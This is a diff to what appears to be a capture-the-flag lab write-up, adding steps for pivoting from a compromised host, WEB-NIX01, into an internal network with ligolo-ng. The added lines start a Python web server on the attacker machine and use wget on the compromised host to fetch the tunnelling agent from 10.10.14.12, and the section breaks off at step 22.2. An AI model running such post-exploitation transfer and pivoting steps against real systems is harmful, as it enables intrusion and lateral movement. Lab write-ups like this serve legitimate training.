@@ -630,8 +630,16 @@ We login as james successfully and even get a flag!
 
 <img width="765" height="217" alt="image" src="https://github.com/user-attachments/assets/020fbeb0-4c79-43b0-b8ae-a031dfc5e80c" />
 
-22. Let's pivot into this internal network using ligolo-ng
+22. Let's pivot into this internal network using ligolo-ng. This will be done with the following steps:
 
-```
+22.1 Transfer the Linux version of ligolo-ng agent to WEB-NIX01
 
-```
+On local machine, start web server
+`python3 -m http.server 80`
+
+On WEB-NIX01, use wget to transfer script over
+`wget http://10.10.14.12/agent`
+
+
+
+22.2
